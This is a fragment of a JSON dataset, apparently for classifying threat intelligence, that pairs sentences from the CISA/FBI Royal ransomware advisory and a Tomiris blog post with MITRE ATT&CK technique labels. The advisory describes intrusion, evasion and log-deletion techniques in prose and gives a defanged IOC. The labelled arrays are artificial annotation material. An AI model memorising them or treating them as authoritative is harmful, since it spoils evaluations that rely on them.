            [
                "T1518.001"
            ],
            [
                "T1518.001"
            ],
            [
                "T1012"
            ],
            [
                "T1012"
            ],
            [
                "T1078"
            ],
            [],
            [
                "T1041"
            ],
            [
                "T1113",
                "T1056.001"
            ],
            [
                "T1140"
            ],
            [],
            [
                "T1041",
                "T1566.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1083"
            ],
            [],
            [
                "T1083",
                "T1005"
            ],
            [],
            [],
            [],
            [],
            [
                "T1074.001"
            ],
            [],
            [
                "T1074.001"
            ],
            [
                "T1074.001"
            ],
            [
                "T1027",
                "T1074.001"
            ],
            [
                "T1041",
                "T1071.001"
            ],
            [],
            [],
            [
                "T1105"
            ],
            [
                "T1027"
            ],
            [
                "T1566.001"
            ],
            [
                "T1070.004"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "StopRansomware Royal Ransomware",
        "cti_report": [
            "title: #StopRansomware: Royal Ransomware url: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a SUMMARY Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors.",
            "These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware.",
            "Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources. ",
            "Actions to take today to mitigate cyber threats from ransomware: Prioritize remediating known exploited vulnerabilities. ",
            "Train users to recognize and report phishing attempts. ",
            "Enable and enforce multifactor authentication. ",
            "The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known Royal ransomware IOCs and TTPs identified through FBI threat response activities as recently as January 2023. ",
            "Since approximately September 2022, cyber criminals have compromised U.S. and international organizations with a Royal ransomware variant.",
            "FBI and CISA believe this variant, which uses its own custom-made file encryption program, evolved from earlier iterations that used \u201cZeon\u201d as a loader.",
            "After gaining access to victims\u2019 networks, Royal actors disable antivirus software and exfiltrate large amounts of data before ultimately deploying the ransomware and encrypting the systems.",
            "Royal actors have made ransom demands ranging from approximately $1 million to $11 million USD in Bitcoin.",
            "In observed incidents, Royal actors do not include ransom amounts and payment instructions as part of the initial ransom note.",
            "Instead, the note, which appears after encryption, requires victims to directly interact with the threat actor via a .onion URL (reachable through the Tor browser).",
            "Royal actors have targeted numerous critical infrastructure sectors including, but not limited to, Manufacturing, Communications, Healthcare and Public Healthcare (HPH), and Education. ",
            "FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. ",
            "Download the PDF version of this report: #StopRansomware: Royal Ransomware (PDF, 586.96 KB ) ",
            "For a downloadable copy of IOCs, see AA23-061A STIX XML (XML, 114.26 KB ) TECHNICAL DETAILS Note: This advisory uses the MITRE ATT&CK:registered: for Enterprise framework, version 12.",
            "See MITRE ATT&CK for Enterprise for all referenced tactics and techniques. ",
            "Royal ransomware uses a unique partial encryption approach that allows the threat actor to choose a specific percentage of data in a file to encrypt.",
            "This approach allows the actor to lower the encryption percentage for larger files, which helps evade detection.[1]",
            "In addition to encrypting files, Royal actors also engage in double extortion tactics in which they threaten to publicly release the encrypted data if the victim does not pay the ransom. ",
            "Initial Access Royal actors gain initial access to victim networks in a number of ways including: Phishing.",
            "According to third-party reporting, Royal actors most commonly (in 66.7% of incidents) gain initial access to victim networks via successful phishing emails [T1566]. ",
            "According to open-source reporting, victims have unknowingly installed malware that delivers Royal ransomware after receiving phishing emails containing malicious PDF documents [T1566.001], and malvertising [T1566.002].[2] Remote Desktop Protocol (RDP).",
            "The second most common vector Royal actors use (in 13.3% of incidents) for initial access is RDP compromise. ",
            "Public-facing applications.",
            "FBI has also observed Royal actors gain initial access through exploiting public-facing applications [T1190]. Brokers.",
            "Reports from trusted third-party sources indicate that Royal actors may leverage brokers to gain initial access and source traffic by harvesting virtual private network (VPN) credentials from stealer logs. ",
            "Command and Control Once Royal actors gain access to the network, they communicate with command and control (C2) infrastructure and download multiple tools [T1105].",
            "Legitimate Windows software is repurposed by Royal operators to strengthen their foothold in the victim\u2019s network.",
            "Ransomware operators often use open-source projects to aid their intrusion activities; Royal operators have recently been observed using Chisel, a tunneling tool transported over HTTP and secured via SSH [T1572], to communicate with their C2 infrastructure.",
            "FBI has observed multiple Qakbot C2s used in Royal ransomware attacks, but has not yet determined if Royal ransomware exclusively uses Qakbot C2s. ",
            "Lateral Movement and Persistence Royal actors often use RDP to move laterally across the network",
            "[T1021.001].",
            "Microsoft Sysinternals tool PsExec has also been used to aid lateral movement.",
            "FBI has observed Royal actors using remote monitoring and management (RMM) software, such as AnyDesk, LogMeIn, and Atera, for persistence in the victim\u2019s network",
            "[T1133].",
            "In some instances, the actors moved laterally to the domain controller.",
            "In one confirmed case, the actors used a legitimate admin account to remotely log on to the domain controller [T1078].",
            "Once on the domain controller, the threat actor deactivated antivirus protocols",
            "[T1562.001] by modifying Group Policy Objects",
            "[T1484.001]. Exfiltration Royal actors exfiltrate data from victim networks by repurposing legitimate cyber pentesting tools, such as Cobalt Strike, and malware tools and derivatives, such as Ursnif/Gozi, for data aggregation and exfiltration.",
            "According to third-party reporting, Royal actors\u2019 first hop in exfiltration and other operations is usually a U.S. IP address. ",
            "Note: In reference to Cobalt Strike and other tools mentioned above, a tool repository used by Royal was identified at IP: 94.232.41[.]105 in December 2022. ",
            "Encryption Before starting the encryption process, Royal actors: Use Windows Restart Manager to determine whether targeted files are currently in use or blocked by other applications [T1486].[1] Use Windows Volume Shadow Copy service (vssadmin.exe) to delete shadow copies to prevent system recovery.[1] FBI has found numerous batch (.bat) files on impacted systems which are typically transferred as an encrypted 7zip file.",
            "Batch files create a new admin user [T1078.002], force a group policy update, set pertinent registry keys to auto-extract",
            "[T1119]",
            "and execute the ransomware, monitor the encryption process, and delete files upon completion\u2014including Application, System, and Security event logs [T1070.001]. ",
            "Malicious files have been found in victim networks in the following directories: C:\\Temp\\ C:\\Users\\ "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1562.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1566.001"
            ],
            [
                "T1021.001"
            ],
            [],
            [
                "T1190"
            ],
            [],
            [
                "T1105"
            ],
            [],
            [],
            [],
            [
                "T1021.001"
            ],
            [],
            [
                "T1570"
            ],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1562.001"
            ],
            [
                "T1484.001"
            ],
            [],
            [],
            [],
            [
                "T1027",
                "T1059.003"
            ],
            [
                "T1059.003",
                "T1484.001"
            ],
            [],
            [
                "T1070.004"
            ],
            []
        ]
    },
    {
        "doc_title": "Tomiris called they want their Turla malware back",
        "cti_report": [
            "title: Tomiris called, they want their Turla malware back\nurl: https://securelist.com/tomiris-called-they-want-their-turla-malware-back/109552/\n\nWe continued to track Tomiris as a separate threat actor over three new attack campaigns between 2021 and 2023, and our telemetry allowed us to shed light on the group.",
            "In this blog post, we\u2019re excited to share what we now know of Tomiris with the broader community, and discuss further evidence of a possible connection to Turla.\n"
        ],
        "label": [
            [],
            []
        ]
    }
]